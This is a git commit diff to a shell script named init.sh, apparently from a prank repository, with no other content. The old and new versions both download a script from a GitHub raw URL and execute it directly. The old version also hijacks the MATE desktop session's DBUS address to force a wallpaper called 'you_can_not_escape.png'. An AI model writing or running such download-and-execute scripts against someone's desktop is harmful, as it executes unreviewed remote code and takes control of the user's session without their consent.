4b4c4597eb8cbf5821d8ebf424eaaca7fd17129d
Govind <govind96@users.noreply.github.com>
2017-10-03 11:08:17 +0530

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,12 +1,9 @@
 #!/bin/bash
 
-PID=$(pgrep mate-session)
-export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/$PID/environ|cut -d= -f2-)
-wget https://raw.githubusercontent.com/govind96/lol_wallpaper/master/dank_wallpaper.py -P /home/user/Downloads
-python /home/user/Downloads/dank_wallpaper.py
-sleep 2
-gsettings set org.mate.background picture-filename /home/user/.config/you_can_not_escape.png
-#rm /home/user/Downloads/dank_wallpaper.py
+wget https://raw.githubusercontent.com/govind96/lol_wallpaper/master/init2.sh -P /home/user/Downloads
+bash /home/user/Downloads/init2.sh
 sleep 5
-#commenting now to see the effect
-#rm /home/user/Pictures/you_can_not_escape.png
+#Will remove later
+#rm bash /home/user/Downloads/init2*.sh
+
+
